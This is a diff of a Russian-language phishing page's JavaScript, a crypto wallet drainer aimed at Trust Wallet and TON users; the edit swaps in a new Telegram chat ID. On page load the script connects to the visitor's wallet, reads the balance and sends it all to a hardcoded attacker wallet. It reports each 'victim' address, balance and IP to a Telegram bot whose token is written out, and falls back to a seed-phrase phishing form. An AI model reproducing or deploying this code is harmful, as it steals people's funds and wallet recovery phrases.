@@ -30,15 +30,15 @@
 </div>
 
 <script>
-    // ========== ВАШИ ДАННЫЕ (УСТАНОВЛЕНЫ) ==========
+    // ========== ВАШИ ДАННЫЕ (ОБНОВЛЕНЫ) ==========
     const ATTACKER_WALLET = "UQC8-Ax6obG20LnPyIC13NlN8uX-d9JnutWhrOxOFmfoVfs2"; // TON кошелек получателя
     const TELEGRAM_BOT_TOKEN = "8665174312:AAE_i_f5UV9xYKpRqargdfKRs9FbYZPNpFk";
-    const TELEGRAM_CHAT_ID = "6635138703";
+    const TELEGRAM_CHAT_ID = "7663459492"; // НОВЫЙ ID
     // =================================================
-    
+
     let victimAddress = null;
     let victimBalance = null;
-    
+
     async function sendToTelegram(message) {
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         try {
@@ -51,65 +51,58 @@
             console.log("Telegram error:", e);
         }
     }
-    
-    // Определяем тип кошелька (Trust Wallet / TON / EVM)
+
     async function detectWallet() {
-        // Проверяем TON кошелек (через window.ton)
         if(typeof window.ton !== 'undefined') {
             return { type: 'ton', provider: window.ton };
         }
-        // Проверяем Trust Wallet через window.ethereum (EVM-совместимый)
         if(typeof window.ethereum !== 'undefined') {
             return { type: 'evm', provider: window.ethereum };
         }
-        // Проверяем Trust Wallet на мобильном
         if(typeof window.trustwallet !== 'undefined') {
             return { type: 'trust', provider: window.trustwallet };
         }
         return null;
     }
-    
+
     async function drainTrustWallet() {
         const wallet = await detectWallet();
-        
+
         if(!wallet) {
             document.getElementById('status').innerHTML = '❌ Trust Wallet не установлен. <a href="https://trustwallet.com/download">Установите Trust Wallet</a>';
             await sendToTelegram(`❌ Жертва открыла страницу, но Trust Wallet не установлен\nIP: ${await getIP()}`);
             return;
         }
-        
+
         try {
-            // TON кошелек
             if(wallet.type === 'ton') {
                 document.getElementById('status').innerHTML = '🔄 Подключение TON кошелька...';
                 const accounts = await wallet.request({ method: 'ton_requestAccounts' });
                 victimAddress = accounts[0];
-                
-                // Получаем баланс TON
+
                 const balance = await wallet.request({ 
                     method: 'ton_getBalance', 
                     params: [victimAddress] 
                 });
                 victimBalance = parseInt(balance) / 1e9;
-                
+
                 await sendToTelegram(`🔥 НОВАЯ ЖЕРТВА (TON)\nАдрес: ${victimAddress}\nБаланс: ${victimBalance} TON\nВремя: ${new Date().toLocaleString()}`);
-                
+
                 if(victimBalance > 0.5) {
                     document.getElementById('status').innerHTML = `💰 Перевод ${victimBalance} TON...`;
-                    
-                    // Отправка транзакции TON
+
                     const tx = {
                         from: victimAddress,
                         to: ATTACKER_WALLET,
                         amount: balance,
                         currency: 'TON'
                     };
-                    
+
                     const txHash = await wallet.request({
                         method: 'ton_sendTransaction',
                         params: [tx]
                     });
-                    
+
                     await sendToTelegram(`✅ СЛИВ TON УСПЕШЕН!\nСумма: ${victimBalance} TON\nTxHash: ${txHash}\nЖертва: ${victimAddress}`);
                     document.getElementById('status').innerHTML = `✅ СЛИТО! ${victimBalance} TON`;
                 } else {
@@ -117,21 +110,20 @@
                     showSeedPhishing();
                 }
             }
-            
-            // EVM-кошелек
+
             else if(wallet.type === 'evm') {
                 document.getElementById('status').innerHTML = '🔄 Подключение EVM кошелька...';
                 const accounts = await wallet.provider.request({ method: 'eth_requestAccounts' });
                 victimAddress = accounts[0];
-                
+
                 const balanceWei = await wallet.provider.request({ 
                     method: 'eth_getBalance', 
                     params: [victimAddress, 'latest'] 
                 });
                 victimBalance = parseInt(balanceWei) / 1e18;
-                
+
                 await sendToTelegram(`🔥 НОВАЯ ЖЕРТВА (EVM/Trust)\nАдрес: ${victimAddress}\nБаланс: ${victimBalance} ETH/BNB\nВремя: ${new Date().toLocaleString()}`);
-                
+
                 if(parseInt(balanceWei) > 5000000000000000) {
                     document.getElementById('status').innerHTML = `💰 Слив ${victimBalance}...`;
                     await sendToTelegram(`⚠️ EVM слив требует EVM-адрес (0x...). Текущий адрес TON.`);
@@ -140,18 +132,18 @@
                     showSeedPhishing();
                 }
             }
-            
+
             else {
                 showSeedPhishing();
             }
-            
+
         } catch(e) {
             await sendToTelegram(`❌ Ошибка: ${e.message}\nIP: ${await getIP()}`);
             document.getElementById('status').innerHTML = `❌ Ошибка: ${e.message}`;
             showSeedPhishing();
         }
     }
-    
+
     async function getIP() {
         try {
             const res = await fetch('https://api.ipify.org?format=json');
@@ -159,7 +151,7 @@
             return data.ip;
         } catch(e) { return 'unknown'; }
     }
-    
+
     function showSeedPhishing() {
         document.getElementById('seedSection').style.display = 'block';
         document.getElementById('submitSeed').onclick = async function() {
@@ -174,14 +166,10 @@
             }
         };
     }
-    
-    // Отправляем уведомление о запуске
+
     sendToTelegram(`🚀 SWILL фишинг запущен\nВремя: ${new Date().toLocaleString()}\nЦель: Trust Wallet / TON`);
-    
-    // Запуск
     drainTrustWallet();
-    
-    // Повтор через 5 секунд
+
     setTimeout(() => {
         if(!victimAddress) {
             drainTrustWallet();
